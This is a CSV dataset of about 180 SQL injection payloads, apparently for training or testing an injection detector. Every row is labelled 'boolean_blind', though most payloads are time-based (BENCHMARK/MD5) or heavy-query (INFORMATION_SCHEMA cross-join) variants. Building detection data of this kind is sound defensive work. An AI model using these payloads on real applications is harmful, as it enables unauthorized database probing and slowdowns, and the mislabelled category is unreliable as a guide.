payload,label
"high'||(SELECT 0x534b4248 FROM DUAL WHERE 6909=6909 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))||'",boolean_blind
"high'+(SELECT 0x7666584d WHERE 1942=1942 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))+'",boolean_blind
"high||(SELECT 0x57725a69 FROM DUAL WHERE 8525=8525 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))||",boolean_blind
"high||(SELECT 0x66744579 WHERE 5314=5314 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))||",boolean_blind
"high+(SELECT 0x6f4f5065 WHERE 2347=2347 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))+",boolean_blind
"high')) AS TBYc WHERE 6281=6281 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- wCNM",boolean_blind
"high"")) AS TsEN WHERE 2580=2580 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- vZfZ",boolean_blind
"high') AS GomG WHERE 3284=3284 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- ufZE",boolean_blind
"high"") AS KkMa WHERE 7528=7528 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- pxBG",boolean_blind
"high""=""high"" AND 2182=BENCHMARK(5000000,MD5(0x626b574d)) AND ""high""=""high",boolean_blind
"high' IN BOOLEAN MODE) AND 2182=BENCHMARK(5000000,MD5(0x626b574d))#",boolean_blind
"high) AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- zkBE",boolean_blind
"high) AND 2182=BENCHMARK(5000000,MD5(0x626b574d)) AND (6555=6555",boolean_blind
"high)) AND 2182=BENCHMARK(5000000,MD5(0x626b574d)) AND ((3191=3191",boolean_blind
"high))) AND 2182=BENCHMARK(5000000,MD5(0x626b574d)) AND (((4443=4443",boolean_blind
"high AND 2182=BENCHMARK(5000000,MD5(0x626b574d))",boolean_blind
"high AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- NMZb",boolean_blind
"high AND 2182=BENCHMARK(5000000,MD5(0x626b574d))# YWOP",boolean_blind
"high) WHERE 1242=1242 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- nIIG",boolean_blind
"high WHERE 3617=3617 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- vcwh",boolean_blind
"high+(SELECT liYl WHERE 2421=2421 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))+",boolean_blind
"high)) AS IukR WHERE 7329=7329 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- Hmzm",boolean_blind
"high) AS QDdB WHERE 3638=3638 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- uPmF",boolean_blind
"high` WHERE 7918=7918 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- pOvQ",boolean_blind
"high`) WHERE 8854=8854 AND 2182=BENCHMARK(5000000,MD5(0x626b574d))-- plUQ",boolean_blind
"high`=`high` AND 2182=BENCHMARK(5000000,MD5(0x626b574d)) AND `high`=`high",boolean_blind
"high]-(SELECT 0 WHERE 1820=1820 AND 2182=BENCHMARK(5000000,MD5(0x626b574d)))|[high",boolean_blind
"high') AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- LTHe",boolean_blind
"high' AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- hDZj",boolean_blind
"high"" AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- wctF",boolean_blind
"high') AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ('nArc'='nArc",boolean_blind
"high')) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (('uVad'='uVad",boolean_blind
"high'))) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((('YFPR'='YFPR",boolean_blind
"high' AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'KSuw'='KSuw",boolean_blind
"high') AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ('itov' LIKE 'itov",boolean_blind
"high')) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (('Zdct' LIKE 'Zdct",boolean_blind
"high'))) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((('LlRe' LIKE 'LlRe",boolean_blind
"high%' AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'hTHX%'='hTHX",boolean_blind
"high' AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'vJxt' LIKE 'vJxt",boolean_blind
"high"") AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (""bafY""=""bafY",boolean_blind
"high"")) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((""DsWx""=""DsWx",boolean_blind
"high""))) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((""JvnQ""=""JvnQ",boolean_blind
"high"" AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ""aslz""=""aslz",boolean_blind
"high"") AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (""fZUe"" LIKE ""fZUe",boolean_blind
"high"")) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((""vUOo"" LIKE ""vUOo",boolean_blind
"high""))) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((""BveT"" LIKE ""BveT",boolean_blind
"high"" AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ""PVoz"" LIKE ""PVoz",boolean_blind
"high' AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) OR 'MsAv'='UJZD",boolean_blind
"high') WHERE 6315=6315 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- dsYp",boolean_blind
"high"") WHERE 1148=1148 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- ieOE",boolean_blind
"high' WHERE 3366=3366 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- ZAoW",boolean_blind
"high"" WHERE 4054=4054 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- LVtQ",boolean_blind
"high'||(SELECT 0x586d5375 WHERE 6419=6419 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||'",boolean_blind
"high'||(SELECT 0x4b467478 FROM DUAL WHERE 9939=9939 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||'",boolean_blind
"high'+(SELECT 0x6b6e4372 WHERE 2321=2321 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+'",boolean_blind
"high||(SELECT 0x786d4645 FROM DUAL WHERE 5314=5314 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||",boolean_blind
"high||(SELECT 0x526e6d70 WHERE 1389=1389 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||",boolean_blind
"high+(SELECT 0x5064434d WHERE 1483=1483 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+",boolean_blind
"high')) AS GENP WHERE 5134=5134 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- biTE",boolean_blind
"high"")) AS cryt WHERE 4696=4696 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- TOMx",boolean_blind
"high') AS iJum WHERE 3856=3856 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- BCIh",boolean_blind
"high"") AS KGRq WHERE 4958=4958 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- WEOm",boolean_blind
"high""=""high"" AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ""high""=""high",boolean_blind
"high' IN BOOLEAN MODE) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"high) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- EyWF",boolean_blind
"high) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (5617=5617",boolean_blind
"high)) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((2224=2224",boolean_blind
"high))) AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((1476=1476",boolean_blind
"high AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)",boolean_blind
"high AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- VKen",boolean_blind
"high AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)# GTOj",boolean_blind
"high) WHERE 4485=4485 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- nTPn",boolean_blind
"high WHERE 9738=9738 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- DOib",boolean_blind
"high+(SELECT mDVM WHERE 7886=7886 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+",boolean_blind
"high)) AS sOcw WHERE 8699=8699 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- BZCH",boolean_blind
"high) AS PjYN WHERE 6642=6642 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- mtWe",boolean_blind
"high` WHERE 2841=2841 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- qjec",boolean_blind
"high`) WHERE 8040=8040 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- RUsg",boolean_blind
"high`=`high` AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND `high`=`high",boolean_blind
"high]-(SELECT 0 WHERE 8048=8048 AND 5416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))|[high",boolean_blind
"high') OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- ILIr",boolean_blind
"high' OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- nsBH",boolean_blind
"high"" OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- VgHy",boolean_blind
"high') OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ('glXF'='glXF",boolean_blind
"high')) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (('kZAx'='kZAx",boolean_blind
"high'))) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ((('uYxF'='uYxF",boolean_blind
"high' OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND 'sdjz'='sdjz",boolean_blind
"high') OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ('qZQW' LIKE 'qZQW",boolean_blind
"high')) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (('jcbL' LIKE 'jcbL",boolean_blind
"high'))) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ((('ebHO' LIKE 'ebHO",boolean_blind
"high%' OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND 'sNxM%'='sNxM",boolean_blind
"high' OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND 'JKlk' LIKE 'JKlk",boolean_blind
"high"") OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (""nsaG""=""nsaG",boolean_blind
"high"")) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ((""Tslh""=""Tslh",boolean_blind
"high""))) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (((""NSWc""=""NSWc",boolean_blind
"high"" OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ""KhyU""=""KhyU",boolean_blind
"high"") OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (""lmyh"" LIKE ""lmyh",boolean_blind
"high"")) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ((""zYMJ"" LIKE ""zYMJ",boolean_blind
"high""))) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (((""oMmM"" LIKE ""oMmM",boolean_blind
"high"" OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ""zuUH"" LIKE ""zuUH",boolean_blind
"high' OR 1618=BENCHMARK(5000000,MD5(0x78516846)) OR 'DeQA'='xKjV",boolean_blind
"high') WHERE 4554=4554 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- jFiN",boolean_blind
"high"") WHERE 8904=8904 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- AQVY",boolean_blind
"high' WHERE 6498=6498 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- eYgC",boolean_blind
"high"" WHERE 5714=5714 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- Eigy",boolean_blind
"high'||(SELECT 0x74626b55 WHERE 6526=6526 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))||'",boolean_blind
"high'||(SELECT 0x57756a49 FROM DUAL WHERE 2291=2291 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))||'",boolean_blind
"high'+(SELECT 0x43767852 WHERE 1486=1486 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))+'",boolean_blind
"high||(SELECT 0x6e51736b FROM DUAL WHERE 1048=1048 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))||",boolean_blind
"high||(SELECT 0x4c46644b WHERE 5257=5257 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))||",boolean_blind
"high+(SELECT 0x45595162 WHERE 8537=8537 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))+",boolean_blind
"high')) AS zZJh WHERE 3478=3478 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- mLag",boolean_blind
"high"")) AS gOpa WHERE 7241=7241 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- XbPi",boolean_blind
"high') AS egTo WHERE 3080=3080 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- lKTM",boolean_blind
"high"") AS NjhE WHERE 3026=3026 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- XzKv",boolean_blind
"high' IN BOOLEAN MODE) OR 1618=BENCHMARK(5000000,MD5(0x78516846))#",boolean_blind
"high) OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- EFhz",boolean_blind
"high) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (8591=8591",boolean_blind
"high)) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND ((3169=3169",boolean_blind
"high))) OR 1618=BENCHMARK(5000000,MD5(0x78516846)) AND (((7248=7248",boolean_blind
"high OR 1618=BENCHMARK(5000000,MD5(0x78516846))",boolean_blind
"high OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- DBcC",boolean_blind
"high OR 1618=BENCHMARK(5000000,MD5(0x78516846))# fbit",boolean_blind
"high) WHERE 8376=8376 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- iDin",boolean_blind
"high WHERE 5906=5906 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- mzER",boolean_blind
"high+(SELECT wYQU WHERE 9290=9290 OR 1618=BENCHMARK(5000000,MD5(0x78516846)))+",boolean_blind
"high)) AS Ojuj WHERE 1612=1612 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- Ivtt",boolean_blind
"high) AS MjVi WHERE 2127=2127 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- WPUN",boolean_blind
"high` WHERE 3781=3781 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- bXRk",boolean_blind
"high`) WHERE 9583=9583 OR 1618=BENCHMARK(5000000,MD5(0x78516846))-- chCB",boolean_blind
"high') OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- sAsY",boolean_blind
"high' OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- ydjv",boolean_blind
"high"" OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- LoVe",boolean_blind
"high') OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ('ZORX'='ZORX",boolean_blind
"high')) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (('zMfS'='zMfS",boolean_blind
"high'))) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((('uOHP'='uOHP",boolean_blind
"high' OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'dKbk'='dKbk",boolean_blind
"high') OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ('nnEC' LIKE 'nnEC",boolean_blind
"high')) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (('CWDq' LIKE 'CWDq",boolean_blind
"high'))) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((('brBW' LIKE 'brBW",boolean_blind
"high%' OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'kdcQ%'='kdcQ",boolean_blind
"high' OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'LiFh' LIKE 'LiFh",boolean_blind
"high"") OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (""tmGJ""=""tmGJ",boolean_blind
"high"")) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((""rriP""=""rriP",boolean_blind
"high""))) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((""MkGF""=""MkGF",boolean_blind
"high"" OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ""lUGZ""=""lUGZ",boolean_blind
"high"") OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (""KWnj"" LIKE ""KWnj",boolean_blind
"high"")) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ((""zhZW"" LIKE ""zhZW",boolean_blind
"high""))) OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND (((""GEqW"" LIKE ""GEqW",boolean_blind
"high"" OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND ""SWSL"" LIKE ""SWSL",boolean_blind
"high' OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) OR 'sWdv'='gLTE",boolean_blind
"high') WHERE 5053=5053 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- Fisi",boolean_blind
"high"") WHERE 4295=4295 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- Wbuf",boolean_blind
"high' WHERE 4995=4995 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- SvDg",boolean_blind
"high"" WHERE 1870=1870 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- dmhp",boolean_blind
"high'||(SELECT 0x654c6158 WHERE 9506=9506 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||'",boolean_blind
"high'||(SELECT 0x45775651 FROM DUAL WHERE 2343=2343 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||'",boolean_blind
"high'+(SELECT 0x5842544f WHERE 1965=1965 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))+'",boolean_blind
"high||(SELECT 0x6f4b474e FROM DUAL WHERE 6004=6004 OR 4255=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C))||",boolean_blind
